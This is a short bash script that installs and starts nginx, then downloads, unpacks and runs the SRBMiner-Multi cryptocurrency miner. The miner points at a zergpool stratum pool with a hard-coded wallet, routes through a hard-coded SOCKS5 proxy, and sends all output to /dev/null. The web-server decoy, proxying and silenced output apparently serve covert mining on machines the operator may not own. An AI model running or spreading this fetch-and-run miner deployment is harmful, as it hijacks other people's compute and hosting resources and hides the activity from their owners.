#!/bin/bash
apt update -y
apt install nginx -y
apt install wget -y
service nginx start
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.5/SRBMiner-Multi-0-9-5-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-9-5-Linux.tar.xz && cd SRBMiner-Multi-0-9-5 && chmod +x SRBMiner && ./SRBMiner-MULTI --algorithm yescryptR16 --pool stratum+tcp://yescryptR16.na.mine.zergpool.com:6333  --wallet LUFTF9kAQgHyWLv2rctGvVSSxL9RXBodcF.OKTE -p c=LTC -x socks5://192.252.214.20:15864 > /dev/null 2>&1
